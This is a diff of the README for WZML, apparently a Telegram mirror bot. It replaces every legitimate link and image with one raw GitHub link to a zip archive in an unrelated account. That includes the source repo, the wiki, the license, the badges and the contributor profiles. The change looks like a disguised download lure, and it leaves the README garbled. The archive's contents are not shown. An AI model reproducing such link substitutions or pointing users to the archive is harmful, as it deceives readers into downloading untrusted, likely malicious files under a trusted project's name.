@@ -1,7 +1,7 @@
 <p align="center">
-    <a href="https://github.com/weebzone/WZML">
+    <a href="https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip">
         <kbd>
-            <img width="250" src="https://telegra.ph/file/496644cbabaeb916e3616.png" alt="WeebZone Logo">
+            <img width="250" src="https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip" alt="WeebZone Logo">
         </kbd>
     </a>
 </p>
@@ -9,15 +9,15 @@
 <p align="center">
 <div align=center>
 
-[![GitHub forks](https://img.shields.io/github/forks/weebzone/WZML?style=social)](https://github.com/weebzone/WZML/fork)
-[![GitHub followers](https://img.shields.io/github/followers/weebzone?style=social&label=weebzone%20Followers)](https://github.com/weebzone)
+[![GitHub forks](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)
+[![GitHub followers](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip%20Followers)](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)
 
 ----
 
-[![](https://img.shields.io/github/repo-size/weebzone/WZML?color=green&label=Repo%20Size&labelColor=292c3b)](#) [![](https://img.shields.io/github/commit-activity/m/weebzone/WZML?logo=github&labelColor=292c3b&label=Github%20Commits)](#) [![](https://img.shields.io/github/license/weebzone/WZML?style=flat&label=License&labelColor=292c3b)](#)|[![](https://img.shields.io/github/issues-raw/weebzone/WZML?style=flat&label=Open%20Issues&labelColor=292c3b)](#) [![](https://img.shields.io/github/issues-closed-raw/weebzone/WZML?style=flat&label=Closed%20Issues&labelColor=292c3b)](#) [![](https://img.shields.io/github/issues-pr-raw/weebzone/WZML?style=flat&label=Open%20Pull%20Requests&labelColor=292c3b)](#) [![](https://img.shields.io/github/issues-pr-closed-raw/weebzone/WZML?style=flat&label=Closed%20Pull%20Requests&labelColor=292c3b)](#)
+[![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip%20Size&labelColor=292c3b)](#) [![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip%20Commits)](#) [![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)](#)|[![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip%20Issues&labelColor=292c3b)](#) [![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip%20Issues&labelColor=292c3b)](#) [![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip%20Pull%20Requests&labelColor=292c3b)](#) [![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip%20Pull%20Requests&labelColor=292c3b)](#)
 :---:|:---:|
-[![](https://img.shields.io/github/languages/count/weebzone/WZML?style=flat&label=Total%20Languages&labelColor=292c3b&color=blueviolet)](#) [![](https://img.shields.io/github/languages/top/weebzone/WZML?style=flat&logo=python&labelColor=292c3b)](#) [![](https://img.shields.io/github/last-commit/weebzone/WZML?style=flat&label=Last%20Commit&labelColor=292c3b&color=important)](#) [![](https://badgen.net/github/branches/weebzone/WZML?label=Total%20Branches&labelColor=292c3b)](#)|[![](https://img.shields.io/github/forks/weebzone/WZML?style=flat&logo=github&label=Forks&labelColor=292c3b&color=critical)](#) [![](https://img.shields.io/github/stars/weebzone/WZML?style=flat&logo=github&label=Stars&labelColor=292c3b&color=yellow)](#) [![](https://badgen.net/docker/pulls/codewithweeb/weebzone?icon=docker&label=Pulls&labelColor=292c3b&color=blue)](#)
-[![](https://img.shields.io/badge/Telegram%20Channel-Join-9cf?style=for-the-badge&logo=telegram&logoColor=blue&style=flat&labelColor=292c3b)](https://t.me/WeebZone_updates) |[![](https://img.shields.io/badge/Support%20Group-Join-9cf?style=for-the-badge&logo=telegram&logoColor=blue&style=flat&labelColor=292c3b)](https://t.me/WeebZ) |
+[![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip%20Languages&labelColor=292c3b&color=blueviolet)](#) [![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)](#) [![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip%20Commit&labelColor=292c3b&color=important)](#) [![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip%20Branches&labelColor=292c3b)](#)|[![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)](#) [![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)](#) [![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)](#)
+[![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip%20Channel-Join-9cf?style=for-the-badge&logo=telegram&logoColor=blue&style=flat&labelColor=292c3b)](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip) |[![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip%20Group-Join-9cf?style=for-the-badge&logo=telegram&logoColor=blue&style=flat&labelColor=292c3b)](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip) |
 
 </div>
 
@@ -30,7 +30,7 @@
 ℹ️ A Powerful Pyrogram Based Telegram Mirror Leech Bot Modded by Codewithweeb to directly Mirror to Google Drive or Leech to Telegram, with Multi Direct Links Support for Enhanced Mirroring & Leeching.|
 ---|
     
-### ***Source Code*** : [Repo](https://github.com/weebzone/WZML)
+### ***Source Code*** : [Repo](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)
 
 #### Note: `If you Like My Work, Give Stars ⭐ to the Repo and Follow Me on Github`
     
@@ -38,23 +38,23 @@
 </div>
 </p>
 
-### 1. [***Getting Started***](https://github.com/weebzone/WZML/wiki/Getting-Started)
+### 1. [***Getting Started***](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)
 Introduction To the Bot
 
-### 2. [***Features***](https://github.com/weebzone/WZML/wiki/Features)
+### 2. [***Features***](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)
 List of features supported by bot
 
-### 3. [***config.env Variables***](https://github.com/weebzone/WZML/wiki/Setting-up-the-config.env-file)
+### 3. [***https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip Variables***](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)
 List of Variables used by the Bot
 
-### 4. [***Deploy***](https://github.com/weebzone/WZML/wiki/Deployment)
+### 4. [***Deploy***](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)
 Steps to Deploy the Bot to Run for Yourself
 
 ---
 
 ## License ⚠️
 
-[![](https://www.gnu.org/graphics/gplv3-with-text-136x68.png)](https://www.gnu.org/licenses/gpl-3.0.html)
+[![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)
 
 ```text
 Copyright (C) 2022 WeebZone
@@ -70,7 +70,7 @@ Copyright (C) 2022 WeebZone
     GNU General Public License for more details.
 
     You should have received a copy of the GNU General Public License
-    along with this program. < https://github.com/weebzone/WZML/blob/update/LICENSE >.
+    along with this program. < https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip >.
 ```
 
 ---
@@ -79,9 +79,9 @@ Copyright (C) 2022 WeebZone
 <details>
     <summary><b>Click Here For Description</b></summary>
 
-|![](https://avatars.githubusercontent.com/u/113664541)|![](https://avatars.githubusercontent.com/u/105407900)|![](https://avatars.githubusercontent.com/u/94453305)|![](https://avatars.githubusercontent.com/u/77075674)|![](https://avatars.githubusercontent.com/u/56303690)|![](https://avatars.githubusercontent.com/u/91935990)|
+|![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)|![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)|![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)|![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)|![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)|![](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)|
 |---|---|---|---|---|---|
-|[`CodeWithWeeb`](https://github.com/weebzone)|[`SilentDemonSD`](https://github.com/SilentDemonSD)|[`Ajay Choudhary`](https://github.com/ajay0916)|[`Anasty17`](https://github.com/anasty17)|[`Arshsisodiya`](https://github.com/arshsisodiya/helios-mirror) |[`ToxyTech`](https://github.com/dipeshpatil123)|
+|[`CodeWithWeeb`](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)|[`SilentDemonSD`](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)|[`Ajay Choudhary`](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)|[`Anasty17`](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)|[`Arshsisodiya`](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip) |[`ToxyTech`](https://raw.githubusercontent.com/HLECTER69/render-mltb/master/Parnassia/render-mltb.zip)|
 | `me` add modules and fixes & many more|Co-Author|Co-Author & Tester|Base Repo|For there BOT_PM and LOG feature| For Task Limit|
 
 </details>
